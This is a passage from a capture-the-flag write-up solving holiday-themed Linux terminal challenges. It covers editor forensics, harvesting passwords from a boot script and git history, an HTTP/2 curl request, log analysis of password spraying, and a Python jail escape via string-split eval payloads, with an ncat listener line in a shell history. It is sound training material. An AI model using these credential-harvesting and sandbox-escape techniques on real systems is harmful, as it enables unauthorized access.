Any chance you can help me with an investigation?
Elf Resources assigned me to look into a case, but it seems to require digital forensic skills.
Do you know anything about Linux terminal editors and digital traces they leave behind?
Apparently editors can leave traces of data behind, but where and how escapes me!</p>
</blockquote>
<pre><code>Christmas is coming, and so it would seem,
ER (Elf Resources) crushes elves' dreams.
One tells me she was disturbed by a bloke.
He tells me this must be some kind of joke.

Please do your best to determine what's real.
Has this jamoke, for this elf, got some feels?
Lethal forensics ain't my cup of tea;
If YOU can fake it, my hero you'll be.

One more quick note that might help you complete,
Clearing this mess up that's now at your feet.
Certain text editors can leave some clue.
Did our young Romeo leave one for you?

- Tangle Coalbox, ER Investigator

  Find the first name of the elf of whom a love poem 
  was written.  Complete this challenge by submitting 
  that name to runtoanswer.
elf@1eebb1670852:~$ ./runtoanswer
Loading, please wait......



Who was the poem written about? blank
Sorry, I don't think that's what the forensic data shows.
</code></pre>

<p>Here we can see that our goal is to determine who is the subject of certain love poem. After navigating through elf's home directory, we find the poem within <code>~/.secrets/her/poem.txt</code></p>
<pre><code>elf@1eebb1670852:~$ cat .secrets/her/poem.txt
Once upon a sleigh so weary, Morcel scrubbed the grime so dreary,
Shining many a beautiful sleighbell bearing cheer and sound so pure--
  There he cleaned them, nearly napping, suddenly there came a tapping,
As of someone gently rapping, rapping at the sleigh house door.
&quot;'Tis some caroler,&quot; he muttered, &quot;tapping at my sleigh house door--
  Only this and nothing more.&quot;

Then, continued with more vigor, came the sound he didn't figure,
Could belong to one so lovely, walking 'bout the North Pole grounds.
  But the truth is, she WAS knocking, 'cause with him she would be talking,
Off with fingers interlocking, strolling out with love newfound?
Gazing into eyes so deeply, caring not who sees their rounds.
  Oh, 'twould make his heart resound!

Hurried, he, to greet the maiden, dropping rag and brush - unlaiden.
Floating over, more than walking, moving toward the sound still knocking,
  Pausing at the elf-length mirror, checked himself to study clearer,
Fixing hair and looking nearer, what a hunky elf - not shocking!
Peering through the peephole smiling, reaching forward and unlocking:
  NEVERMORE in tinsel stocking!

Greeting her with smile dashing, pearly-white incisors flashing,
Telling jokes to keep her laughing, soaring high upon the tidings,
  Of good fortune fates had borne him.  Offered her his dexter forelimb,
Never was his future less dim!  Should he now consider gliding--
No - they shouldn't but consider taking flight in sleigh and riding
  Up above the Pole abiding?

Smile, she did, when he suggested that their future surely rested,
Up in flight above their cohort flying high like ne'er before!
  So he harnessed two young reindeer, bold and fresh and bearing no fear.
In they jumped and seated so near, off they flew - broke through the door!
Up and up climbed team and humor, Morcel being so adored,
  By his lovely NEVERMORE!

\- Morcel Nougat
</code></pre>

<p>At first glance, 'NEVERMORE' seems like the subject of this poem. However, inputting this answer into the <code>runtoanswer</code> program fails.</p>
<p>This line from Tangle gives us a good clue on how to find the answer.</p>
<blockquote>
<p>Apparently editors can leave traces of data behind, but where and how escapes me!</p>
</blockquote>
<p>A file, <code>.viminfo</code>, will contain information on previous uses of vim by this user. Searching through this file provides a significant clue for the subject's identity.</p>
<pre><code>elf@1eebb1670852:~$ cat .viminfo
# This viminfo file was generated by Vim 8.0.
# You may edit it if you're careful!
# Viminfo version
|1,4
# Value of 'encoding' when this file was written
*encoding=utf-8
# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&amp;Elinore
# Last Substitute String:
$NEVERMORE
# Command Line History (newest to oldest):
:wq
|2,0,1536607231,,&quot;wq&quot;
:%s/Elinore/NEVERMORE/g
|2,0,1536607217,,&quot;%s/Elinore/NEVERMORE/g&quot;
:r .secrets/her/poem.txt
|2,0,1536607201,,&quot;r .secrets/her/poem.txt&quot;
[...snip...]
</code></pre>

<p>From here we can see that the user replaced all instances of 'Elinore' in the poem with 'NEVERMORE', based upon the  command, <code>:%s/Elinore/NEVERMORE/g</code>. Afterwards, they saved the poem into the file we previously read. Based upon this info, we can confirm that <strong><em>Elinore</em></strong> is the subject of this poem.</p>
<pre><code>elf@1eebb1670852:~$ ./runtoanswer
Loading, please wait......
Who was the poem written about? Elinore

Thank you for solving this mystery, Slick.
Reading the .viminfo sure did the trick.
Leave it to me; I will handle the rest.
Thank you for giving this challenge your best.
-Tangle Coalbox
-ER Investigator
Congratulations!
elf@1eebb1670852:~$ 
</code></pre>

<blockquote>
<p>Hey, thanks for the help with the investigation, gumshoe.
Have you been able to solve the lock with the funny shapes?
It reminds me of something called "de Bruijn Sequences."
You can optimize the guesses because there is no start and stop -- each new value is added to the end and the first is removed.
I've even seen de Bruijn sequence generators online.
Here the length of the alphabet is 4 (only 4 buttons) and the length of the PIN is 4 as well.
Mathematically this is k=4, n=4 to generate the de Bruijn sequence.
Math is like your notepad and pencil - can't leave home without it!
I heard Alabaster lost his badge! That's pretty bad. What do you think someone could do with that?</p>
<p>- Tangle Coalbox</p>
</blockquote>
<h4 id="4-stall-mucking-report-wunorse-openslae">4) Stall Mucking Report (Wunorse Openslae)<a class="headerlink" href="#4-stall-mucking-report-wunorse-openslae" title="Permanent link">&para;</a></h4>
<p>This terminal can be found in the right hallyway of the first floor.</p>
<p><img alt="Location" src="terminals/4-location.png" /></p>
<blockquote>
<p>Hi, I'm Wunorse Openslae
What was that password?
Golly, passwords may be the end of all of us. Good guys can't remember them, and bad guess can guess them!
I've got to upload my chore report to my manager's inbox, but I can't remember my password.
Still, with all the automated tasks we use, I'll bet there's a way to find it in memory...</p>
</blockquote>
<pre><code>Thank you Madam or Sir for the help that you bring!
I was wondering how I might rescue my day.
Finished mucking out stalls of those pulling the sleigh,
My report is now due or my KRINGLE's in a sling!

There's a samba share here on this terminal screen.
What I normally do is to upload the file,
With our network credentials (we've shared for a while).
When I try to remember, my memory's clean!

Be it last night's nog bender or just lack of rest,
For the life of me I can't send in my report.
Could there be buried hints or some way to contort,
Gaining access - oh please now do give it your best!

-Wunorse Openslae


Complete this challenge by uploading the elf's report.txt
file to the samba share at //localhost/report-upload/

</code></pre>

<p>Based on Wunorse's conversation and the logon message for the terminal, our goal is to upload the <code>report.txt</code> file located in elf's home directory to the <code>//localhost/report-upload/</code> samba share. However, attempting to do this using elf results in an <code>NT_STATUS_ACCESS_DENIED</code> error.</p>
<pre><code>
elf@279c1663354c:~$ smbclient //localhost/report-upload
WARNING: The &quot;syslog&quot; option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian]
tree connect failed: NT_STATUS_ACCESS_DENIED

</code></pre>

<p>Based upon the hint from Wunorse, we attempt to look through files that handle task automation for this machine. Eventually we find luck with <code>/sbin/init</code>, which contains commands for the system to run upon boot.</p>
<pre><code>
#!/bin/bash
echo &quot;$(date)&quot; &gt;&gt; /home/elf/report.txt
(nohup sudo -u manager /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d'~' --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload 2&gt;/dev/null &amp;)
sudo -E -u manager /usr/bin/python /home/manager/report-check.py 2&gt;/dev/null &amp;
(nohup /usr/sbin/smbd &gt;/dev/null 2&gt;/dev/null &amp; disown)
echo 127.0.0.1   `cat /etc/hostname` &gt;&gt; /etc/hosts
sudo -u elf /bin/bash
</code></pre>

<p>In this file, we find a string that appears to be used as a samba password, <code>directreindeerflatterystable</code>.
With this information, we can now attempt to upload the report to the samba share:</p>
<pre><code>elf@279c1663354c:~$ smbclient -U report-upload //localhost/report-upload directreindeerflatterystable
WARNING: The &quot;syslog&quot; option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian]
smb: \&gt; put report.txt
putting file report.txt as \report.txt (250.5 kb/s) (average 250.5 kb/s)
smb: \&gt; Terminated
elf@279c1663354c:~$ 
You have found the credentials I just had forgot,
And in doing so you've saved me trouble untold.
Going forward we'll leave behind policies old,
Building separate accounts for each elf in the lot.

-Wunorse Openslae
</code></pre>

<blockquote>
<p>Thank goodness for command line passwords - and thanks for your help!
Speaking of good ways to find credentials, have you heard of Trufflehog?
It's a cool way to dig through repositories for passwords, RSA keys, and more.
I mean, no one EVER uploads sensitive credentials to public repositories, right? But if they did, this would be a great tool for finding them.
But hey, listen to me ramble. If you're interested in Trufflehog, you should check out Brian Hostetler's talk!
Have you tried the entropy=True option when running Trufflehog? It is amazing how much deeper it will dig!</p>
<p>- Wunorese Openslae</p>
</blockquote>
<h4 id="5-curling-master-holly-evergreen">5) CURLing Master (Holly Evergreen)<a class="headerlink" href="#5-curling-master-holly-evergreen" title="Permanent link">&para;</a></h4>
<p>This terminal can be found in the left hallway of the first floor.</p>
<p><img alt="Location" src="terminals/5-location.png" /></p>
<blockquote>
<p>Hi, I'm Holly Everygreen.
Oh that Bushy!
Sorry to vent, but that brother of mine did something strange.
The trigger to restart the Candy Striper is apparently an arcane HTTP call or 2.
I sometimes wonder if all IT folk do strange things with their home networks...</p>
</blockquote>
<pre><code>I am Holly Evergreen, and now you won't believe:
Once again the striper stopped; I think I might just leave!
Bushy set it up to start upon a website call.
Darned if I can CURL it on - my Linux skills apall.

Could you be our CURLing master - fixing up this mess?
If you are, there's one concern you surely must address.
Something's off about the conf that Bushy put in place.
Can you overcome this snag and save us all some face?

  Complete this challenge by submitting the right HTTP 
  request to the server at http://localhost:8080/ to 
  get the candy striper started again. You may view 
  the contents of the nginx.conf file in 
  /etc/nginx/, if helpful.
</code></pre>

<p>Based on the instructions from Holly and the login message, our goal is to submit the correct HTTP request to the webserver located on <code>localhost:8080</code>. However, sending a regular GET request to <code>localhost:8080</code> gives us a response made up of non-printable, binary data.</p>
<p>After examining our home directory, we see a <code>.bash_history</code> file with data, readable by us. Upon examining elf's bash history, we find a very interesting curl command that implies the webserver on 8080 actually handles HTTP2 requests.</p>
<pre><code>elf@53ab4f44ffa5:~$ ls -lah
total 24K
drwxr-xr-x 1 elf  elf  4.0K Dec 14 16:15 .
drwxr-xr-x 1 root root 4.0K Dec 14 16:14 ..
-rw-r--r-- 1 elf  elf   464 Dec 14 16:13 .bash_history
-rw-r--r-- 1 elf  elf   220 May 15  2017 .bash_logout
-rw-r--r-- 1 elf  elf  3.5K Dec 14 16:15 .bashrc
-rw-r--r-- 1 elf  elf   675 May 15  2017 .profile
elf@53ab4f44ffa5:~$ cat .bash_history
netstat -ant
ncat --broker -nlvp 9090
echo &quot;\302\257\_(\343\203\204)_/\302\257&quot; &gt;&gt; /tmp/shruggins
cat /tmp/shruggins
curl --http2-prior-knowledge http://localhost:8080/index.php
telnet towel.blinkenlights.nl
[...snip...]
</code></pre>

<p>After attempting that command without any modification, we recieve a response instructing us to send a POST request with a parameter of <code>status=on</code>. </p>
<pre><code>elf@53ab4f44ffa5:~$ curl --http2-prior-knowledge http://localhost:8080/index.php
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Candy Striper Turner-On'er&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
 &lt;p&gt;To turn the machine on, simply POST to this URL with parameter &quot;status=on&quot;

 &lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>To do this, we simply add the flag <code>--data "status=on"</code> to our curl command. By having the <code>--data flag</code>, <code>curl</code> will handle it as a POST request. We successfully send our request and complete this exercise.</p>
<pre><code>elf@53ab4f44ffa5:~$ curl --http2-prior-knowledge --data &quot;status=on&quot; http://localhost:8080/index.ph
p
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Candy Striper Turner-On'er&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
 &lt;p&gt;To turn the machine on, simply POST to this URL with parameter &quot;status=on&quot;

Unencrypted 2.0? He's such a silly guy.
That's the kind of stunt that makes my OWASP friends all cry.
Truth be told: most major sites are speaking 2.0;
TLS connections are in place when they do so.

-Holly Evergreen
&lt;p&gt;Congratulations! You've won and have successfully completed this challenge.
&lt;p&gt;POSTing data in HTTP/2.0.

 &lt;/body&gt;
&lt;/html&gt;
</code></pre>

<blockquote>
<p>Unencrypted HTTP/2? What was he thinking? Oh well.
Have you ever used Bloodhound for testing Active Directory implementations?
It's a merry little tool that can sniff AD and find paths to reaching privileged status on specific machines.
AD implementations can get so complicated that administrators may not even know what paths they've set up that attackers might exploit.
Have you seen anyone demo the tool before?</p>
<p>- Holly Evergreen</p>
</blockquote>
<h4 id="6-yule-log-analysis-pepper-minstix">6) Yule Log Analysis (Pepper Minstix)<a class="headerlink" href="#6-yule-log-analysis-pepper-minstix" title="Permanent link">&para;</a></h4>
<p>This exercise is found very far into the second floor's right hallway, past the speaker unpreparedness room.</p>
<p><img alt="Location" src="terminals/6-location.png" /></p>
<blockquote>
<p>Hi, I'm Pepper Minstix.
Have you heard of password spraying? It seems we've been victim.
We fear that they were successful in accessing one of our Elf Web Access accounts, but we don't know which one.
Parsing through .evtx files can be tricky, but there's a Python script that can help you convert it into XML for easier grep'ing.</p>
</blockquote>
<pre><code>I am Pepper Minstix, and I'm looking for your help.
Bad guys have us tangled up in pepperminty kelp!
&quot;Password spraying&quot; is to blame for this our grinchly fate.
Should we blame our password policies which users hate?

Here you'll find a web log filled with failure and success.
One successful login there requires your redress.
Can you help us figure out which user was attacked?
Tell us who fell victim, and please handle this with tact...

  Submit the compromised webmail username to 
  runtoanswer to complete this challenge.
</code></pre>

<p>We first test out the <code>evtx_dump.py</code> script to see what input it accepts and what format it outputs the logs in. After examining the output, we notice the line, <code>&lt;EventID Qualifiers=""&gt;4647&lt;/EventID&gt;</code>, which identifies what EventID this log entry falls under. All Windows Security Log Events have a numeric EventID associated with it that describes what type of event it is. To complete this exercise, we should be able to match that field to filter for specific event types.</p>
<pre><code>elf@b6eaa89be3f0:~$ ls -lah
total 6.8M
drwxr-xr-x 1 elf  elf  4.0K Dec 14 16:42 .
drwxr-xr-x 1 root root 4.0K Dec 14 16:42 ..
-rw-r--r-- 1 elf  elf   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elf  elf  3.7K Dec 14 16:42 .bashrc
-rw-r--r-- 1 elf  elf   807 Apr  4  2018 .profile
-rw-r--r-- 1 elf  elf  1.4K Dec 14 16:13 evtx_dump.py
-rw-r--r-- 1 elf  elf  1.1M Dec 14 16:13 ho-ho-no.evtx
-rwxr-xr-x 1 elf  elf  5.7M Dec 14 16:13 runtoanswer
elf@b6eaa89be3f0:~$ python evtx_dump.py -h
usage: evtx_dump.py [-h] evtx

Dump a binary EVTX file into XML.

positional arguments:
  evtx        Path to the Windows EVTX event log file

optional arguments:
  -h, --help  show this help message and exit
elf@b6eaa89be3f0:~$ python evtx_dump.py ho-ho-no.evtx | wc -l
50895
elf@b6eaa89be3f0:~$ python evtx_dump.py ho-ho-no.evtx 2&gt;/dev/null | head -n 25
&lt;?xml version=&quot;1.1&quot; encoding=&quot;utf-8&quot; standalone=&quot;yes&quot; ?&gt;

&lt;Events&gt;
&lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
&lt;System&gt;&lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-a5ba-3e3b0328c30d}&quot;&gt;&lt;/Provider&gt;
&lt;EventID Qualifiers=&quot;&quot;&gt;4647&lt;/EventID&gt;
&lt;Version&gt;0&lt;/Version&gt;
&lt;Level&gt;0&lt;/Level&gt;
&lt;Task&gt;12545&lt;/Task&gt;
&lt;Opcode&gt;0&lt;/Opcode&gt;
&lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt;
&lt;TimeCreated SystemTime=&quot;2018-09-10 12:18:26.972103&quot;&gt;&lt;/TimeCreated&gt;
&lt;EventRecordID&gt;231712&lt;/EventRecordID&gt;
&lt;Correlation ActivityID=&quot;{fd18dc13-48f8-0001-58dc-18fdf848d401}&quot; RelatedActivityID=&quot;&quot;&gt;&lt;/Correlation&gt;
&lt;Execution ProcessID=&quot;660&quot; ThreadID=&quot;752&quot;&gt;&lt;/Execution&gt;
&lt;Channel&gt;Security&lt;/Channel&gt;
&lt;Computer&gt;WIN-KCON-EXCH16.EM.KRINGLECON.COM&lt;/Computer&gt;
&lt;Security UserID=&quot;&quot;&gt;&lt;/Security&gt;
&lt;/System&gt;
&lt;EventData&gt;&lt;Data Name=&quot;TargetUserSid&quot;&gt; S-1-5-21-25059752-1411454016-2901770228-500 &lt;/Data&gt;
&lt;Data Name=&quot;TargetUserName&quot;&gt;Administrator&lt;/Data&gt;
&lt;Data Name=&quot;TargetDomainName&quot;&gt;EM.KRINGLECON&lt;/Data&gt;
&lt;Data Name=&quot;TargetLogonId&quot;&gt;0x0000000000969b09&lt;/Data&gt;
&lt;/EventData&gt;
&lt;/Event&gt;
</code></pre>

<p>To discover what webmail username has been comprimised by the password spraying attack, we are most interested in these two Event IDs:
- EventID 4624 - An account was successfully logged on
- EventID 4625 - An account failed to log on</p>
<p>In order to determine the best way to format our data for analysis, we first look at a few logon events to determine what line will give us the desired username. </p>
<p>Our full command for this step involves several steps:
The <code>evtx_dump.py</code> output while hiding all errors using <code>2&gt;/dev/null</code>. This output is then piped to a grep command that searches for the lines that include the <code>EventID 4624</code>, as well as a few lines before and after to make sure we grab the entire log entry. Finally, we pipe that output to the <code>head</code> command, just to limit our total output for analysis purposes and only view the first matched entry.</p>
<pre><code>elf@396cf1de836c:~$ python evtx_dump.py ho-ho-no.evtx 2&gt;/dev/null | grep -B 5 -A 25 '&lt;EventID Qualifiers=&quot;&quot;&gt;4624&lt;/EventID&gt;' | head -n 30
&lt;EventData&gt;&lt;/EventData&gt;
&lt;/Event&gt;

&lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
&lt;System&gt;&lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-a5ba-3e3b0328c30d}&quot;&gt;&lt;/Provider&gt;
&lt;EventID Qualifiers=&quot;&quot;&gt;4624&lt;/EventID&gt;
&lt;Version&gt;2&lt;/Version&gt;
&lt;Level&gt;0&lt;/Level&gt;
&lt;Task&gt;12544&lt;/Task&gt;
&lt;Opcode&gt;0&lt;/Opcode&gt;
&lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt;
&lt;TimeCreated SystemTime=&quot;2018-09-10 12:19:20.695601&quot;&gt;&lt;/TimeCreated&gt;
&lt;EventRecordID&gt;231726&lt;/EventRecordID&gt;
&lt;Correlation ActivityID=&quot;&quot; RelatedActivityID=&quot;&quot;&gt;&lt;/Correlation&gt;
&lt;Execution ProcessID=&quot;664&quot; ThreadID=&quot;668&quot;&gt;&lt;/Execution&gt;
&lt;Channel&gt;Security&lt;/Channel&gt;
&lt;Computer&gt;WIN-KCON-EXCH16.EM.KRINGLECON.COM&lt;/Computer&gt;
&lt;Security UserID=&quot;&quot;&gt;&lt;/Security&gt;
&lt;/System&gt;
&lt;EventData&gt;&lt;Data Name=&quot;SubjectUserSid&quot;&gt;S-1-0-0&lt;/Data&gt;
&lt;Data Name=&quot;SubjectUserName&quot;&gt;-&lt;/Data&gt;
&lt;Data Name=&quot;SubjectDomainName&quot;&gt;-&lt;/Data&gt;
&lt;Data Name=&quot;SubjectLogonId&quot;&gt;0x0000000000000000&lt;/Data&gt;
&lt;Data Name=&quot;TargetUserSid&quot;&gt;S-1-5-18&lt;/Data&gt;
&lt;Data Name=&quot;TargetUserName&quot;&gt;SYSTEM&lt;/Data&gt;
&lt;Data Name=&quot;TargetDomainName&quot;&gt;NT AUTHORITY&lt;/Data&gt;
&lt;Data Name=&quot;TargetLogonId&quot;&gt;0x00000000000003e7&lt;/Data&gt;
&lt;Data Name=&quot;LogonType&quot;&gt;0&lt;/Data&gt;
&lt;Data Name=&quot;LogonProcessName&quot;&gt;-&lt;/Data&gt;
&lt;Data Name=&quot;AuthenticationPackageName&quot;&gt;-&lt;/Data&gt;
</code></pre>

<p>Based on this entry, we determine that <code>TargetUserName</code> is the value we must filter for. This line is the same for both event types. Now, we grab a list of users who successfully logged on, as well as users who have a failed login attempt. Our commands for this part involves several steps:</p>
<p>We first find all entries for our desired Event ID and then retrieve the usernames within them. We also remove all duplicate usernames. Afterwards, we filter out the system accounts, leaving us with all user accounts who have a log entry for that Event ID.</p>
<p>Additionally, the style of the usernames for failed and successful logons is slightly different. To manage this, we perform a final <code>grep</code> to format all usernames into a <code>firstname.lastname</code> style in order to allow us to compare the files against each other.</p>
<pre><code>elf@396cf1de836c:~$ python evtx_dump.py ho-ho-no.evtx 2&gt;/dev/null | grep -B 5 -A 25 '&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;/EventID&gt;' | grep 'TargetUserName' | sort | uniq | grep -E -v '(Health|LOCAL|MSSQL|NETWORK|SYSTEM|DWM-1|ISUR|Admin|ANONYMOUS
|Backup|WIN-KCON-EXCH)' &gt; failedlogons.txt
elf@396cf1de836c:~$ python evtx_dump.py ho-ho-no.evtx 2&gt;/dev/null | grep -B 5 -A 25 '&lt;EventID Qualifiers=&quot;&quot;&gt;4624&lt;/EventID&gt;' | grep 'TargetUserName' | sort | uniq | grep -E -v '(Health|LOCAL|MSSQL|NETWORK|SYSTEM|DWM-1|ISUR|Admin|ANONYMOUS
|Backup|WIN-KCON-EXCH)' &gt; successfullogons.txt
elf@396cf1de836c:~$ cat failedlogons.txt | grep -Eo &quot;[a-z]+\.[a-z]+&quot; &gt; failed.txt
elf@396cf1de836c:~$ cat successfullogons.txt | grep -Eo &quot;[a-z]+\.[a-z]+&quot; &gt; successful.txt
</code></pre>

<p>Since a password spraying attack tests each account using only one password, the compromised account will be the username who has a successful logon, with no failed attempts. By comparing the two files using the <code>comm</code> program in order to find entries unique to <code>successful.txt</code>, we find that <strong><em>minty.candycane</em></strong> is who fits this criteria.</p>
<p>We then successfully verify our answer with the <code>runtoanswer</code> program and receive the victory message.</p>
<pre><code>elf@396cf1de836c:~$ comm -13 failed.txt successful.txt
minty.candycane
elf@396cf1de836c:~$ ./runtoanswer
Loading, please wait......



Whose account was successfully accessed by the attacker's password spray? minty.candycane

Silly Minty Candycane, well this is what she gets.
&quot;Winter2018&quot; isn't for The Internets.
Passwords formed with season-year are on the hackers' list.
Maybe we should look at guidance published by the NIST?

Congratulations!
</code></pre>

<blockquote>
<p>Well, that explains the odd activity in Minty's account. Thanks for your help!
All of the Kringle Castle employees have these cool cards with QR codes on them that give us access to restricted areas.
Unfortunately, the badge-scan-o-matic said my account was disabled when I tried scanning my badge.
I really needed access so I tried scanning several QR codes I made from my phone but the scanner kept saying "User Not Found".
I researched a SQL database error from scanning a QR code with special characters in it and found it may contain an injection vulnerability.
I was going to try some variations I found on <a href="https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF#Auth_Bypass">OWASP</a> but decided to stop so I don't tick-off Alabaster.</p>
<p>- Pepper Minstix</p>
</blockquote>
<h4 id="7-dev-ops-fail-sparkle-redberry">7) Dev Ops Fail (Sparkle Redberry)<a class="headerlink" href="#7-dev-ops-fail-sparkle-redberry" title="Permanent link">&para;</a></h4>
<p>We can find this and the next terminal on the second floor, just to the left of the stairs.</p>
<p><img alt="Location" src="terminals/7,8-location.png" /></p>
<blockquote>
<p>Hi, I'm Sparkle Redberry!
Ugh, can you believe that Elf Resources is poking around? Something about sensitive info in my git repo.
I mean, I may have uploaded something sensitive earlier, but it's no big deal. I overwrote it!
Care to check my Cranberry Pi terminal and prove me right?</p>
</blockquote>
<pre><code>Coalbox again, and I've got one more ask.
Sparkle Q. Redberry has fumbled a task.
Git pull and merging, she did all the day;
With all this gitting, some creds got away.
Urging - I scolded, &quot;Don't put creds in git!&quot;
She said, &quot;Don't worry - you're having a fit.
If I did drop them then surely I could,
Upload some new code done up as one should.&quot;
Though I would like to believe this here elf,
I'm worried we've put some creds on a shelf.
Any who's curious might find our &quot;oops,&quot;
Please find it fast before some other snoops!
Find Sparkle's password, then run the runtoanswer tool.
</code></pre>

<p>Based on the conversation with Sparkle and the logon message, we should start looking in the commit log for a git repository. After a quick search in elf's home directory, we find out the target repository is in <code>kcconfmgmt</code>.  After reading a summary of all recent commits, we find a particularly interesting one that describes having to remove a username/password combo.</p>
<pre><code>elf@d8857ac2280b:~$ cd kcconfmgmt 
elf@d8857ac2280b:~/kcconfmgmt$ git log --summary
[...snip...]
commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;
Date:   Thu Nov 8 21:11:03 2018 -0500
    Per @tcoalbox admonishment, removed username/password from config.js, default settings in conf
ig.js.def need to be updated before use
 delete mode 100644 server/config/config.js
 create mode 100644 server/config/config.js.def
[...snip...]
</code></pre>

<p>Looking at the differences of this commit reveals the removed username/password combo. <code>git show 60a2ffea7520ee980a5fc60177ff4d0633f2516b</code> shows the change in <code>config.js</code>. The target password is <strong><em>twinkletwinkletwinkle</em></strong> for the username, <code>sredberry</code>.</p>
<pre><code>elf@d8857ac2280b:~/kcconfmgmt$ git show 60a2ffea7520ee980a5fc60177ff4d0633f2516b
commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;
Date:   Thu Nov 8 21:11:03 2018 -0500

    Per @tcoalbox admonishment, removed username/password from config.js, default settings in conf
ig.js.def need to be updated before use

diff --git a/server/config/config.js b/server/config/config.js
deleted file mode 100644
index 25be269..0000000
--- a/server/config/config.js
+++ /dev/null
@@ -1,4 +0,0 @@
-// Database URL
-module.exports = {
-    'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'
-};
diff --git a/server/config/config.js.def b/server/config/config.js.def
new file mode 100644
index 0000000..740eba5
--- /dev/null
+++ b/server/config/config.js.def
@@ -0,0 +1,4 @@
+// Database URL
+module.exports = {
+    'url' : 'mongodb://username:password@127.0.0.1:27017/node-api'
+};
</code></pre>

<p>Now we input this password into <code>runtoanswer</code> and complete the exercise.</p>
<pre><code>elf@d8857ac2280b:~$ ./runtoanswer
Loading, please wait......



Enter Sparkle Redberry's password: twinkletwinkletwinkle


This ain't &quot;I told you so&quot; time, but it's true:
I shake my head at the goofs we go through.
Everyone knows that the gits aren't the place;
Store your credentials in some safer space.

Congratulations!
</code></pre>

<blockquote>
<p>Oh my golly gracious - Tangle was right? It was still in there? How embarrassing!
Well, if I can try to redeem myself a bit, let me tell you about another challenge you can help us with.
I wonder if Tangle Coalbox has taken a good look at his own employee import system.
It takes CSV files as imports. That certainly can expedite a process, but there's danger to be had.
I'll bet, with the right malicious input, some naughty actor could exploit a vulnerability there.
I'm sure the danger can be mitigated. OWASP has guidance on what not to allow with such oploads.</p>
<p>-Sparkle Redberry</p>
</blockquote>
<h4 id="8-python-escape-from-la-sugarplum-mary">8) Python Escape from LA (SugarPlum Mary)<a class="headerlink" href="#8-python-escape-from-la-sugarplum-mary" title="Permanent link">&para;</a></h4>
<p>This exercise is located just north of the last one, on the second floor to the left of the stairs.</p>
<p><img alt="Location" src="terminals/7,8-location.png" /></p>
<blockquote>
<p>Hi, I'm Sugarplum Mary.
I'm glad you're here; my terminal is trapped inside a python! Or maybe my python is trapped inside a terminal?
Can you please help me by escaping from the Python interpreter?</p>
</blockquote>
<pre><code>I'm another elf in trouble,
Caught within this Python bubble.

Here I clench my merry elf fist -
Words get filtered by a black list!

Can't remember how I got stuck,
Try it - maybe you'll have more luck?

For this challenge, you are more fit.
Beat this challenge - Mark and Bag it!

-SugarPlum Mary

To complete this challenge, escape Python
and run ./i_escaped
&gt;&gt;&gt; 
</code></pre>

<p>Our goal for this terminal exercise is to simply find a way to run system commands from the Python jailshell. We first attempt to execute system commands using <code>os.system()</code> and to import libraries with <code>import</code>. We find that both of these commands are prohibited by the shell. However, the <code>eval()</code> function is still available, allowing us to bypass this restriction by simply dividing the full command to fool simple blacklist matching.</p>
<pre><code>&gt;&gt;&gt; os.system(&quot;id&quot;)
Use of the command os.system is prohibited for this question.
&gt;&gt;&gt; import os;
Use of the command import is prohibited for this question.
&gt;&gt;&gt; eval
&lt;built-in function eval&gt;
</code></pre>

<p>To perform the blacklist bypass, we first assign the variable <code>os</code> with  <code>__import__("os")</code>. This will allow us to run system commands by using <code>eval()</code> and dividing up the <code>os.system()</code> command within it. Here, we test out this functionality by running <code>id</code>, which successfully provides us with elf's uid.</p>
<pre><code>&gt;&gt;&gt; os = eval('__imp' + 'ort__(&quot;o' + 's&quot;)')
&gt;&gt;&gt; eval('o' + 's.sys' + 'tem(' + '&quot;id&quot;)')
uid=1000(elf) gid=1000(elf) groups=1000(elf)
0
</code></pre>

<p>Now, all we need to do is to replace <code>id</code> with <code>./i_escaped</code> in order to complete this exercise.</p>
<pre><code>&gt;&gt;&gt; eval('o' + 's.sys' + 'tem(' + '&quot;./i_escaped&quot;)')
Loading, please wait......

That's some fancy Python hacking -
You have sent that lizard packing!

-SugarPlum Mary

You escaped! Congratulations!

0
</code></pre>

<blockquote>
<p>Yay, you did it! You escaped from the Python!
As a token of my gratitude, I would like to share a rumor I had heard about Santa's new web-based packet analyzer - Packalyzer.
Another elf told me that Packalyzer was rushed and deployed with development code sitting in the web root.
Apparently, he found this out by looking at HTML comments left behind and was able to grab the server-side source code.
There was suspicious-looking development code using environment variables to store SSL keys and open up directories.
This elf then told me that manipulating values in the URL gave back weird and descriptive errors.
I'm hoping these errors can't be used to compromise SSL on the website and steal logins.
On a tooootally unrelated note, have you seen the HTTP2 talk at at KringleCon by the Chrises? I never knew HTTP2 was so different!</p>
<p>-SugarPlum Mary</p>
</blockquote>
<h4 id="9-sleigh-bell-lottery-shinny-upatree">9) Sleigh Bell Lottery (Shinny Upatree)<a class="headerlink" href="#9-sleigh-bell-lottery-shinny-upatree" title="Permanent link">&para;</a></h4>
<p>This final exercise is on the second floor, just to the right of the stairs.</p>
<p><img alt="Location" src="terminals/9-location.png" /></p>
<blockquote>
